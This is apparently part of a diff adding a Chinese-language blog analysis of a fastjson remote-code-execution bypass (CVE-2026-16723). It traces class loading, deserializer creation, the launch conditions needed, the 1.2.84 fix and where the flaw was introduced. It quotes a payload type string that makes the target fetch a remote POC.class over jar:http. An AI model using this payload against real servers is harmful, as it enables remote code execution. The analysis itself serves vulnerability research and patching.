+<h3 id="3-恶意类加载"><a href="#3-恶意类加载" class="headerlink" title="3.恶意类加载"></a>3.恶意类加载</h3><p>接下来就到了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);</span><br></pre></td></tr></table></figure>
+
+<p>这个的具体逻辑</p>
+<p><code>jsonType</code>参数为<code>true</code></p>
+<p>意味着此时参数为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clazz = TypeUtils.loadClass(</span><br><span class="line">  <span class="string">&quot;jar:http:..2130706433:9000.probe!.POC&quot;</span>,</span><br><span class="line">  defaultClassLoader,此时为<span class="literal">null</span></span><br><span class="line">  <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-1、进入远程加载"><a href="#3-1、进入远程加载" class="headerlink" title="3.1、进入远程加载"></a>3.1、进入远程加载</h4><p>这里分析的是进入到<code>URLClassLoader#findClass</code>这个常见发起外部请求的方法</p>
+<p>com&#x2F;alibaba&#x2F;fastjson&#x2F;util&#x2F;TypeUtils#loadClass</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211056906.png" alt="image-20260821105624698"></p>
+<p>org&#x2F;springframework&#x2F;boot&#x2F;loader&#x2F;LaunchedURLClassLoader#loadClass</p>
+<p>这里的<code>loadClass</code>函数本质就是调用父类也就是</p>
+<p>而父类的<code>URLClassLoader</code>也没有直接重写<code>loadClass</code>而是它内部类重写了，所以不算</p>
+<p><code>URLClassLoader</code>的父类&#96;&#96;SecureClassLoader直接没有重写<code>loadclass</code>函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211103041.png" alt="image-20260821110309876"></p>
+<p>所以直接调用了祖师爷</p>
+<p><code>java/lang/ClassLoader#loadclass</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211106977.png" alt="image-20260821110614855"></p>
+<p>此时，调用类为<code>LaunchedURLClassLoader</code>调用<code>loadclass</code>，<code>LaunchedURLClassLoader</code>没有重写<code>findclass</code>函数，由此调用父类<code>URLClassLoader</code>重写的</p>
+<p>所以这里准确的调用链就是</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader.loadClass()</span><br><span class="line">  └─ this.findClass(name)</span><br><span class="line">     └─ URLClassLoader.findClass(name)</span><br></pre></td></tr></table></figure>
+
+<p>自此进入一个算是常见的外部请求方法</p>
+<h4 id="3-2、发起外部请求"><a href="#3-2、发起外部请求" class="headerlink" title="3.2、发起外部请求"></a>3.2、发起外部请求</h4><p>这里分析到<code>java</code>发起到外部请求的底层</p>
+<p>java&#x2F;net&#x2F;URLClassLoader#findClass</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211115540.png" alt="image-20260821111540302"></p>
+<p>sun&#x2F;misc&#x2F;URLClassPath#getResource</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211117044.png" alt="image-20260821111702865"></p>
+<p><strong>然后就是重量级选手，之前fastjson单独实现的逻辑</strong></p>
+<p><a href="#2.2%E3%80%81%E6%95%B0%E6%8D%AE%E6%B5%81%E8%BF%9B%E5%85%A5">之前所研究到的发起外部请求的实现</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211119035.png" alt="image-20260821111903953"></p>
+<h4 id="3-3、加载字节码文件"><a href="#3-3、加载字节码文件" class="headerlink" title="3.3、加载字节码文件"></a>3.3、加载字节码文件</h4><p>接着就是函数的返回与加载字节码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211133244.png" alt="image-20260821113325135"></p>
+<p>进一步返回到</p>
+<p>java&#x2F;net&#x2F;URLClassLoader#findClass</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211134249.png" alt="image-20260821113403147"></p>
+<p>调用<code>defineClass</code>加载字节码文件，常见函数没什么好说的</p>
+<p>然后就是返回</p>
+<p><code>ClassLoader</code>类的返回</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211139967.png" alt="image-20260821113952880"></p>
+<p>com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;ParserConfig#checkAutoType的返回</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211141492.png" alt="image-20260821114113396"></p>
+<h4 id="3-4、栈图"><a href="#3-4、栈图" class="headerlink" title="3.4、栈图"></a>3.4、栈图</h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211127183.png" alt="image-20260821112740941"></p>
+<h3 id="4-恶意类实例化"><a href="#4-恶意类实例化" class="headerlink" title="4.恶意类实例化"></a>4.恶意类实例化</h3><p>上一步中</p>
+<p><code>checkAutoType</code>函数已经返回我们要加载的恶意类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211533653.png" alt="image-20260821153349439"></p>
+<p>接着就走到图中第二点获取反序列化器和反序列化类</p>
+<h4 id="4-1、获取反序列化器"><a href="#4-1、获取反序列化器" class="headerlink" title="4.1、获取反序列化器"></a>4.1、获取反序列化器</h4><p>获取反序列化器的栈图如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211535507.png" alt="image-20260821153555393"></p>
+<p>这里返回的是根据<code>poc.class</code>动态生成的 FastjsonASMDeserializer_1_POC 反序列化器</p>
+<p>和普通分支的区别就是</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211537371.png" alt="image-20260821153720176"></p>
+<p>具体逻辑如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211539829.png" alt="image-20260821153957708"></p>
+<p>接着进入到com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;ParserConfig#createJavaBeanDeserializer</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211547803.png" alt="image-20260821154721703"></p>
+<p>当前类下还由一个重要的<code>beanInfo</code>参数 涉及到俩方面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211553328.png" alt="image-20260821155338063"></p>
+<p>这个方法结果就是返回俩种情况下的反序列化器</p>
+<p>条件就是<code>asmEnable</code>的值</p>
+<p>这个值 分析代码之后，由以下几个方面控制</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">类层面：类或父类非 public、带泛型、是接口、非静态内部类、类名不符合 ASM 命名规则、属于外部类、字段数量超过 200、没有无</span><br><span class="line">参构造方法、被 @JSONType(asm = false) 禁用，或属于 XML 特殊类。</span><br><span class="line"></span><br><span class="line">字段和方法层面：字段类型不可访问、非静态内部类字段、字段或方法名不合法、只有 getter 没有可写 setter、setter 参数超过一</span><br><span class="line">个，或者 @JSONField 使用了复杂配置</span><br></pre></td></tr></table></figure>
+
+<p>进一步会调用</p>
+<p><code>com/alibaba/fastjson/parser/deserializer/ASMDeserializerFactory#createJavaBeanDeserializer</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211649588.png" alt="image-20260821164921277"></p>
+<p>ok，现在就是拿到了一个</p>
+<p><code>FastjsonASMDeserializer_1_POC</code> 的实例</p>
+<p>存着</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">参数</span><br><span class="line">clazz</span><br><span class="line">└─ 远程 POC.class</span><br><span class="line"></span><br><span class="line">beanInfo</span><br><span class="line">└─ POC 的构造方法、字段、setter 等元数据</span><br><span class="line"></span><br><span class="line">fieldDeserializers</span><br><span class="line">└─ 每个 JSON 字段对应的解析器</span><br><span class="line"></span><br><span class="line">方法</span><br><span class="line">createInstance(...)</span><br><span class="line">└─ 内部字节码等价于 new POC()</span><br><span class="line"></span><br><span class="line">deserialzeArrayMapping(...)</span><br><span class="line">└─ 处理数组形式 JSON</span><br><span class="line"></span><br><span class="line">deserialze(...)</span><br><span class="line">└─ 当前 POC 没有字段，因此继承 JavaBeanDeserializer 的实现</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-2、实例化恶意类"><a href="#4-2、实例化恶意类" class="headerlink" title="4.2、实例化恶意类"></a>4.2、实例化恶意类</h4><p>实例化恶意类的代码点也就是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>
+
+<p>此时<code>deserializer</code>是动态生成的<code>FastjsonASMDeserializer_1_POC</code></p>
+<p>因为我们的<code>poc.class</code>没有参数，所以直接动态生成的反序列化器没有<code>deserialzer</code>方法</p>
+<p>会直接调用父类<code>JavaBeanDeserializer</code>实现的方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211700400.png" alt="image-20260821170020288"></p>
+<p>这个方法也比较又意思</p>
+<p>会调用一个无限循环读取我们<code>payload</code>剩余的字串</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;x&quot;: 1&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211703470.png" alt="image-20260821170319351"></p>
+<p>还会遇到老熟人<code>@Type</code>二次读取，当然现在重点不是他</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211706284.png" alt="image-20260821170653147"></p>
+<p>接着匹配到 } 时终止循环返回类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211713832.png" alt="image-20260821171320665"></p>
+<p>栈图逻辑就是</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608211714358.png" alt="image-20260821171415163"></p>
+<h3 id="5-一些额外的点"><a href="#5-一些额外的点" class="headerlink" title="5.一些额外的点"></a>5.一些额外的点</h3><h4 id="5-1、发起俩次请求"><a href="#5-1、发起俩次请求" class="headerlink" title="5.1、发起俩次请求"></a>5.1、发起俩次请求</h4><p>发起俩次请求这个问题比较有说法</p>
+<p>深入调试后确认在</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608241510048.png" alt="image-20260824151022923"></p>
+<p>具体的逻辑是</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608241516433.png" alt="image-20260824151638846"></p>
+<p>这里，一次是探测，一次是真正的去加载</p>
+<p>直接上栈图吧</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608241519957.png" alt="image-20260824151902706"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608241519883.png" alt="image-20260824151931549"></p>
+<p>跟踪源码确认逻辑存在，不是ai幻觉</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608241521295.png" alt="image-20260824152113869"></p>
+<h4 id="5-2、目标启动方式"><a href="#5-2、目标启动方式" class="headerlink" title="5.2、目标启动方式"></a>5.2、目标启动方式</h4><p>也就是</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassLoader</span><br><span class="line"> └── java.net.URLClassLoader</span><br><span class="line">        ├── sun.misc.Launcher$AppClassLoader   (JDK8, 即传统意义的 &quot;AppClassLoader&quot;)</span><br><span class="line">        ├── org.springframework.boot.loader.LaunchedURLClassLoader</span><br><span class="line">        (Spring Boot fat jar 专用，用来从嵌套 jar 里加载 BOOT-INF/classes、</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>LaunchedURLClassLoader</code>与<code>AppClassLoader</code>之间的问题</p>
+<p><code>tccl</code> 是 <strong>Thread Context ClassLoader</strong>（线程上下文类加载器）的缩写</p>
+<p>每一个线程都可以通过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getContextClassLoader()</span><br></pre></td></tr></table></figure>
+
+<p>获取独属于自己线程的上下文类加载器</p>
+<p><code>Spring Boot</code>项目一共有俩种启动方式</p>
+<ol>
+<li><p>IDE 里直接右键运行 <code>XxxApplication.main()</code></p>
+<p>此时，主线程的上下文累加载器就是<code>sun.misc.Launcher$AppClassLoader</code></p>
+<p>业务代码等等类都是通过这个类加载器加载此时，主线程的上下文类加载器就是<code>sun.misc.Launcher$AppClassLoader</code></p>
+<p>业务代码等等类都是通过这个类加载器加载</p>
+</li>
+<li><p><code>java -jar xxx.jar</code>（fat jar 方式）</p>
+<p>这时要先用 AppClassLoader 加载 <code>org.springframework.boot.loader.JarLauncher</code></p>
+<p><code>JarLauncher</code> 内部再创建一个自定义的 <code>LaunchedURLClassLoader</code>，去加载 <code>BOOT-INF/classes</code> 和 <code>BOOT-INF/lib/*.jar</code> 里的类，这时的上下文类加载器就是<code>LaunchedURLClassLoader</code></p>
+<p>业务代码（包括启动类本身）实际上是被 <code>LaunchedURLClassLoader</code> 加载的</p>
+</li>
+</ol>
+<p>这俩类加载器有一个区别就是</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608242015966.png" alt="image-20260824201542597"></p>
+<p>具体的原因就是他们的<code>URLClassPath</code>参数不同</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608242053313.png" alt="image-20260824205320953"></p>
+<p>具体启动的时候发生下面的情况</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">在 fat-JAR 启动时：</span><br><span class="line"></span><br><span class="line">LaunchedURLClassLoader</span><br><span class="line">  → URLClassLoader.findResource()</span><br><span class="line">  → Spring Boot jar.Handler</span><br><span class="line">  → 解析 jar:http://.../probe!/POC.class</span><br><span class="line">  → 请求远程 /probe</span><br><span class="line"></span><br><span class="line">IDEA 直接运行时：</span><br><span class="line"></span><br><span class="line">AppClassLoader</span><br><span class="line">  → URLClassLoader.findResource()</span><br><span class="line">  → 普通 URLClassPath</span><br><span class="line">  → 按 target/classes 或普通 jar 资源查找</span><br><span class="line">  → 找不到这个特殊资源</span><br></pre></td></tr></table></figure>
+
+<p>因此说必须使用<code>fatjar</code>的形式去启动程序</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608242057225.png" alt="image-20260824205722947"></p>
+<h4 id="5-3、默认类加载器"><a href="#5-3、默认类加载器" class="headerlink" title="5.3、默认类加载器"></a>5.3、默认类加载器</h4><p>也就是<code>LaunchedURLClassLoader</code>与<code>TomcatEmbeddedWebappClassLoader</code>之间的问题</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassLoader</span><br><span class="line">    ├── java.net.URLClassLoader</span><br><span class="line">    │       └── LaunchedURLClassLoader (Spring Boot fat jar loader)</span><br><span class="line">    │</span><br><span class="line">    └── java.net.URLClassLoader</span><br><span class="line">            └── WebappClassLoaderBase</span><br><span class="line">                    └── ParallelWebappClassLoader</span><br><span class="line">                            └── TomcatEmbeddedWebappClassLoader (Tomcat webapp loader)</span><br></pre></td></tr></table></figure>
+
+<p>web请求进入到java线程时，程序会单独分出一个线程去处理这个任务，此时处理线程的上下文类加载器是<code>TomcatEmbeddedWebappClassLoader</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Web 请求到达时,Tomcat 从预先创建好的 worker 线程池中取出一个空闲线程来处理该请求。在真正执行到 Servlet/Controller 代码之前,Tomcat 会临时把这个线程的 tccl 切换为该 webapp 对应的 TomcatEmbeddedWebappClassLoader;请求处理结束后,Tomcat 会把该线程的 tccl 恢复为切换前的值,以便线程池复用</span><br></pre></td></tr></table></figure>
+
+<p>接着讲我们之前的绕过逻辑</p>
+<p><code>checkAutoType</code>函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608241706214.png" alt="image-20260824170642421"></p>
+<p>检验的时候因为使用的是ParseConfig的类加载器，肯定是<code>Launched</code>，但是<code>TypeUtils.loadclass</code>出现了问题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608241709893.png" alt="image-20260824170914786"></p>
+<p>当上下文类加载器为<code>TomcatEmbeddedWebappClassLoader</code>时，只能加载普通 Webapp 类，当前这个特殊类名经过 Tomcat 的 Class.forName() 委托路径后，被类名校验挡住了</p>
+<p>也就是下面的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608241721127.png" alt="image-20260824172133942"></p>
+<p>因此对于当前项目代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608241724147.png" alt="image-20260824172415024"></p>
+<p>也就解释了为啥 <code>parse</code>接口无法触发类加载</p>
+<h4 id="5-4、目标服务器缓存"><a href="#5-4、目标服务器缓存" class="headerlink" title="5.4、目标服务器缓存"></a>5.4、目标服务器缓存</h4><p>攻击端换了新的 POC.class,但只要 @type 字符串不变，目标 JVM 根本不会再次请求攻击服务器</p>
+<p>checkAutoType函数具体逻辑</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608242033690.png" alt="image-20260824203356524"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608242034166.png" alt="image-20260824203456029"></p>
+<p>因此，恶意poc切换之后需要更换名字，或者重启目标服务器</p>
+<h2 id="二、引入与修复"><a href="#二、引入与修复" class="headerlink" title="二、引入与修复"></a>二、引入与修复</h2><p>2020-03-28 <code>fastjson</code>官方发布<code>1.2.68</code>，这个恶意逻辑被引入，在2022-05-22 发布1.2.83，接着发布1.2.83_noneautotype，自此fastjson1.x 线此后沉寂 4 年 2 个月，在2026-07-29 发布了1.2.84</p>
+<h3 id="1-修复"><a href="#1-修复" class="headerlink" title="1.修复"></a>1.修复</h3><p>修复版本也就是1.2.84做出的处理很简单</p>
+<h4 id="1-1、checkAutoType函数"><a href="#1-1、checkAutoType函数" class="headerlink" title="1.1、checkAutoType函数"></a>1.1、checkAutoType函数<img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608252018022.png" alt="image-20260825201828799"></h4><p>在<code>1.2.84</code>版本中，在这一段的之前的逻辑中加入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608252020879.png" alt="image-20260825202010263"></p>
+<p>这个安全检查的逻辑也比较简单</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608252029718.png" alt="image-20260825202909559"></p>
+<p>但是越是简单的逻辑，就能直接堵死掉我们的绕过方式，这也是代码的魅力吧</p>
+<h4 id="1-2、loadClass函数"><a href="#1-2、loadClass函数" class="headerlink" title="1.2、loadClass函数"></a>1.2、loadClass函数</h4><p>针对于这个函数也加入了拦截逻辑</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608252045231.png" alt="image-20260825204531117"></p>
+<p>对于缓存的处理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608252049288.png" alt="image-20260825204942191"></p>
+<h3 id="2-问题的引入"><a href="#2-问题的引入" class="headerlink" title="2.问题的引入"></a>2.问题的引入</h3><p>对于这个<code>cve</code>绕过逻辑引入的部分，目前主流文章都是以<code>fastjson1.2.68</code>为主，也就是2020-03-28发布的，但是这个版本当初发布时说明了，只是为了增加一个<code>safemode</code>这样的一个安全开关，引入一个安全逻辑怎么可能会造成问题呢，深入探索之后锁定到<code>2018-08-04</code>发布的<code>fastjson1.2.48</code>，但是进一步锁定到的是<code>fastjson1.2.37</code></p>
+<p>相关链接</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">snyk官方</span><br><span class="line">https://security.snyk.io/vuln/SNYK-JAVA-COMALIBABA-18296111</span><br><span class="line"></span><br><span class="line">alibaba通报</span><br><span class="line">https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83</span><br><span class="line"></span><br><span class="line">github情报</span><br><span class="line">https://github.com/advisories/GHSA-crf3-v9rr-v7hj</span><br><span class="line"></span><br><span class="line">gitlab情报</span><br><span class="line">https://advisories.gitlab.com/maven/com.alibaba/fastjson/CVE-2026-16723/</span><br><span class="line"></span><br><span class="line">cve公告</span><br><span class="line">https://cvefeed.io/vuln/detail/CVE-2026-16723</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-1、补丁1-2-68"><a href="#2-1、补丁1-2-68" class="headerlink" title="2.1、补丁1.2.68"></a>2.1、补丁1.2.68</h4><p>补丁<code>1.2.68</code>做出的改动主要就是下面俩点</p>
+<p><strong>safemode</strong>第一次引入，单模式关闭，对本次绕过不影响</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608262032826.png" alt="image-20260826203238705"></p>
+<p>接着就是增加一些黑名单，用来防止某些类的绕过，也不影响</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608262030724.png" alt="image-20260826203008465"></p>
+<p>为了证明一下，我特意找到了<code>1.2.67</code>做证据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608262037759.png" alt="image-20260826203718971"></p>
+<h4 id="2-1、补丁1-2-48"><a href="#2-1、补丁1-2-48" class="headerlink" title="2.1、补丁1.2.48"></a>2.1、补丁1.2.48</h4><p>因为恶意绕过代码逻辑锁定确认到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608261716357.png" alt="image-20260826171601898"></p>
+<p>这个恶意逻辑就是在1.2.48引入，具体理解可以见下方，当初1.2.48做出的改动一共有俩份，一是去将<code>loadclass</code>的缓存参数设置为<code>false</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608261748294.png" alt="image-20260826174851846"></p>
+<p>阻止的是<code>class</code>类缓存投毒那一块的绕过</p>
+<p>另一处改动就是这里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608261850590.png" alt="image-20260826185001099"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/alibaba/fastjson/compare/1.2.47...1.2.48</span><br></pre></td></tr></table></figure>
+
+<p>也就是实质名归的引入了恶意代码逻辑</p>
